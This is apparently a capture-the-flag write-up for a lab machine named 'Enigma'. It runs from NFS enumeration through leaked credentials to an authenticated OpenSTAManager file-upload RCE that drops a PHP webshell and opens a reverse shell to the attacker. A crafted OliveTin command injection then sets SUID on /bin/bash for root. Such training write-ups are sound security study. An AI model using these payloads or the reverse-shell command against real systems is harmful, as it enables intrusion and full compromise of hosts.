# Enigma

## Reconnaissance

Command:

```bash
nmap -sV -sC -T5 <target_ip>
```

The scan reveals SSH (22), an nginx web server on 80 that redirects to `http://enigma.htb/`, a Dovecot mail stack (POP3 110/995, IMAP 143/993), and NFS with rpcbind (111, 2049).

Add `enigma.htb` to `/etc/hosts`.

---

## Triage the Mail Services

The Dovecot POP3/IMAP services expose no point-release in their banners, even under increased probe intensity:

```bash
nmap -sV --version-intensity 9 -p 110,143 <target_ip>
```

Reading the IMAP `CAPABILITY` line manually confirms the same — a version-silent but auth-capable service (`AUTH=PLAIN`, no `LOGINDISABLED` on the encrypted channel):

```text
* OK [CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE LITERAL+ AUTH=PLAIN] Dovecot (Ubuntu) ready.
```

This indicates the mail stack is a credential-consumer, not a foothold — a service to authenticate against once credentials are found elsewhere, not to exploit directly.

---

## Enumerate NFS Exports

Query the exported shares:

```bash
showmount -e <target_ip>
```

Result:

```text
Export list for <target_ip>:
/srv/nfs/onboarding *
```

The `onboarding` share is world-mountable (`*`), the first service on the box exposing content rather than a version banner.

---

## Mount the Share and Read the Onboarding Document

```bash
sudo mkdir -p /mnt/onboarding
sudo mount -t nfs <target_ip>:/srv/nfs/onboarding /mnt/onboarding -o ro,nolock
ls -la /mnt/onboarding
```

The share contains a single world-readable file:

```text
-rw-r--r-- 1 root root 1751 Feb 19  2026 New_Employee_Access.pdf
```

Copy it locally and extract its contents:

```bash
cp /mnt/onboarding/New_Employee_Access.pdf .
pdftotext New_Employee_Access.pdf -
```

The document is a new-employee access sheet containing webmail credentials:

```text
Employee: Kevin Mitchell
Department: Operations
URL: http://mail001.enigma.htb
Username: kevin
Password: Enigma2024!
```

This also leaks a new virtual host — `mail001.enigma.htb`. Add it to `/etc/hosts`.

---

## Read Kevin's Mailbox

The credentials authenticate against the IMAP service over TLS:

```bash
openssl s_client -connect enigma.htb:993 -crlf
```

```text
a login kevin Enigma2024!
a select INBOX
a fetch 1 (BODY[])
```

The inbox holds a single welcome email from `sarah@enigma.htb`, referencing a second user and stating that access credentials would be delivered "via the company shared drive." The `Sent` and `Trash` folders are empty.

---

## Fingerprint the Webmail Application

Identify the application behind the `mail001` vhost:

```bash
whatweb http://mail001.enigma.htb
```

The host runs **Roundcube Webmail**. Logging in with `kevin` / `Enigma2024!` and checking *Settings → About* pins the exact version at **1.6.16** — a release that post-dates the notable Roundcube RCE and SQLi CVEs (e.g. CVE-2025-49113 patched in 1.6.11; CVE-2026-48842 patched in 1.6.16). The version rules out a Roundcube CVE path; the application is a content/pivot surface, not an exploit target.

---

## Recover Support Portal Credentials

Reading the authenticated mailbox surfaces a second message — an IT Support provisioning email addressed to Sarah — containing admin credentials for a support portal:

```text
URL: http://support_001.enigma.htb
Username: admin
Password: Ne3s4rtars78s
```

This leaks a third virtual host — `support_001.enigma.htb`. Add it to `/etc/hosts`.

---

## Fingerprint the Support Portal

```bash
whatweb http://support_001.enigma.htb
```

The portal runs **OpenSTAManager**. Logging in as `admin` and reading the version from the interface confirms **2.9.8** — a release affected by multiple authenticated vulnerabilities, including **CVE-2026-38751**, an authenticated arbitrary file upload leading to RCE via the module update functionality (affects ≤ 2.10).

---

## Exploit OpenSTAManager Authenticated RCE (CVE-2026-38751)

The module update feature allows an authenticated user to upload a ZIP-based module without validation of its contents, deploying a PHP payload into the web root where it executes in the application context.

Exploit used:

https://github.com/b0ySie7e/OpenSTAManager-RCE-Exploit-CVE-2026-38751

```bash
./openstamanager-rce-exploit --url http://support_001.enigma.htb/ -U admin -P 'Ne3s4rtars78s' --lhost <tun0_ip> --lport 4444
```

The exploit authenticates, uploads a malicious module containing a PHP webshell (`modules/shell/shell.php`), and returns a reverse shell as `www-data`.

The dropped webshell is a single-line command executor, confirming the file-upload-to-RCE mechanism:

```php
<?php isset($_GET["c"]) && system($_GET["c"]); ?>
```

---

## Leak Database Credentials from Configuration

Stabilise the shell and read the OpenSTAManager configuration file:

```bash
cat /var/www/html/openstamanager/config.inc.php
```

The config exposes database credentials:

```php
$db_host = 'localhost';
$db_username = 'brollin';
$db_password = 'Fri3nds@9099';
$db_name = 'openstamanager';
```

---

## Dump Application Users and Crack the Hash

Log into the database with the leaked credentials and dump the application's user table:

```bash
mysql -u brollin -p'Fri3nds@9099' openstamanager -e 'select * from zz_users\G'
```

This reveals two application users with bcrypt (`$2y$`) password hashes — `admin` and `haris` — where `haris` matches a home directory on the box:

```bash
ls /home
```

```text
haris  it  kevin  sarah
```

Crack the `haris` hash offline with hashcat (bcrypt, mode 3200):

```bash
hashcat -m 3200 haris.hash /usr/share/wordlists/rockyou.txt
```

The hash cracks to `bestfriends`, which is valid as the system password for `haris`:

```bash
su haris
# bestfriends
```

---

## Retrieve User Flag

```bash
cat /home/haris/user.txt
```

```text
<user_flag>
```

The user flag is obtained.

---

# Privilege Escalation

## Identify a Non-Standard Root Service

Enumerate running processes owned by root:

```bash
ps aux | grep -i root
```

Among the default system services, one non-standard binary runs as root from `/usr/local/bin`:

```text
root  1523  ...  /usr/local/bin/OliveTin
```

OliveTin is a web application that executes predefined shell commands on the host. Confirm its listening socket:

```bash
ss -tlnp
```

```text
LISTEN 0 4096 127.0.0.1:1337 0.0.0.0:*
```

The service listens on `127.0.0.1:1337` (localhost-only, which is why it was not visible in the external scan).

---

## Identify a Command Injection in the OliveTin Config

Read the OliveTin configuration:

```bash
cat /etc/OliveTin/config.yaml
```

The configuration defines a `Backup Database` action that interpolates user-supplied arguments directly into a root shell command, and disables guest login enforcement (`authRequireGuestsToLogin: false`), leaving the API unauthenticated:

```yaml
  - title: Backup Database
    id: backup_database
    shell: "mysqldump -u {{ db_user }} -p'{{ db_pass }}' {{ db_name }} > /opt/backups/backup.sql"
    arguments:
      - name: db_user
        type: ascii_identifier
      - name: db_pass
        type: password
      - name: db_name
        type: ascii_identifier
```

The `db_pass` argument (`type: password`, allowing arbitrary characters) is placed inside single quotes in the shell string, making it a command injection point.

---

## Confirm the OliveTin Version and API Schema

```bash
/usr/local/bin/OliveTin --version
```

```text
version="3000.10.0"
```

The v3000 API selects actions with the `bindingId` key (the older `actionId`/`actionName` keys are deprecated), and the `StartAction` endpoint accepts unauthenticated requests.

---

## Exploit the Command Injection to Escalate to Root

Trigger the vulnerable action, breaking out of the quoted `db_pass` value to set the SUID bit on `/bin/bash`:

```bash
curl -s http://127.0.0.1:1337/api/StartAction --json '{"bindingId":"backup_database","arguments":[{"name":"db_user","value":"backup_svc"},{"name":"db_name","value":"production"},{"name":"db_pass","value":"x'"'"'; chmod +s /bin/bash #"}]}'
```

The API returns an execution tracking ID, confirming the action ran as root:

```json
{"executionTrackingId":"00d96e4d-ccc3-4890-9039-211e3dbeaf6e"}
```

The injected `db_pass` closes `mysqldump`'s `-p'...'`, runs `chmod +s /bin/bash` as root, and comments out the remainder. Confirm and spawn a root shell:

```bash
ls -la /bin/bash
/bin/bash -p
id
```

```text
-rwsr-xr-x 1 root root ... /bin/bash
uid=1000(haris) gid=1000(haris) euid=0(root) ...
```

---

## Retrieve Root Flag

```bash
cat /root/root.txt
```

```text
<root_flag>
```

The root flag is successfully obtained.

---

# Attack Chain

```text
NFS export /srv/nfs/onboarding (world-mountable) →
New_Employee_Access.pdf leaks webmail creds (kevin) + vhost mail001.enigma.htb →
Roundcube mailbox reveals IT Support email with admin creds + vhost support_001.enigma.htb →
OpenSTAManager 2.9.8 authenticated file-upload RCE (CVE-2026-38751) → shell as www-data →
config.inc.php leaks DB creds (brollin:Fri3nds@9099) →
zz_users dump → crack haris bcrypt hash (bestfriends) → su to haris (user flag) →
OliveTin 3000.10.0 running as root on 127.0.0.1:1337 →
Unauthenticated command injection in Backup Database action (db_pass) →
chmod +s /bin/bash → /bin/bash -p → Root Access (root flag)
```